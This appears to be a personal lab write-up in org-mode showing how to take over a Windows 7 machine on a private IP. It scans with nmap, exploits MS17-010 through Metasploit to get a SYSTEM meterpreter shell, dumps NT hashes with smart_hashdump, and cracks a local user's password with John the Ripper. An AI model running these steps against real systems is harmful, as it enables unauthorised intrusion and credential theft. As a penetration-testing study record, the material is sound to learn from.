#+title: Crack Users Password
#+description: How to get user passowrd of windows operating system after gaining access into their system
#+author: Touhidul Shawan

* Get windows 7 user's password
+ Target machine IP: ~192.168.43.65~
+ Operating System (OS): ~Windows 7~

** Check for Vulnerabilities
Find out any kind of vulnerabilities that may have in the targeted machine with the tool ~nmap~

#+begin_src bash
sudo nmap --script vuln 192.168.43.65 -sS
#+end_src

Got a vulnerability called ~Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)~

[[../img/scan_vuln.png]]

** Exploit the target and gain access
Run the ~Metasploit Framwork~
#+begin_src bash
msfconsole
#+end_src

Search for vulnerability ~ms17-010~

[[../img/ms17-010.png]]

Use the first one
#+begin_src bash
use 0
#+end_src

Set options correctly for that module. Here set only the ~RHOST~ IP of target machine
#+begin_src bash
set RHOST 192.168.43.65
#+end_src

Run the exploitation
#+begin_src bash
run
#+end_src

Got the meterpreter shell successfully

[[../img/gain_access.png]]

Check the system information and current user authority level
#+begin_src bash
sysinfo
#+end_src
#+begin_src bash
getuid
#+end_src

[[../sysinfo.png]]

We got the system level access ~NT AUTHORITY\SYSTEM~ which is the highest level access of the system

Now check for ~sam~ file of the system which is ~Security Account Manager~ that stores user accounts and security information on the local computers.

The location for the ~sam~ file is
#+begin_src bash
C:\Windows\System32\config\sam
#+end_src

~For security reason this file is locked. We can not download or access through the meterpreter when the target machine is running although we have manged to get the system with higher level permission~

** Now try a different approach to get the hashes of the users with their security information
Background the current meterpreter with ~backgroung~ or ~bg~ command

Now search for ~hashdump~. And use the ~smart hashdump~ script with background ~session~

[[../img/smart_hashdump.png]]

Run the exploit and save hashes in a text file

[[../img/savehash.png]]

It saves the hash file on my machine in this location
~/home/shawan/.msf4/loot~ as ~20220723162503_default_192.168.43.65_windows.hashes_178877.txt~ [just rename file as ~192.168.43.65_hashes.txt~ to avoid that long name ]

File contains the ~NT~ format hash file

[[../img/hashfile.png]]

Here ~ragnar~ is the local user of target machine. Now we will crack this hash file and try to get the password for ~ragnar~ user with ~john the ripper~ password cracking tool

#+begin_src bash
john --show --format=NT 192.168.43.65_hashes.txt
#+end_src

[[../img/hashcrack.png]]

Now we have gotten the password for ~ragnar~ user which is ~ts~
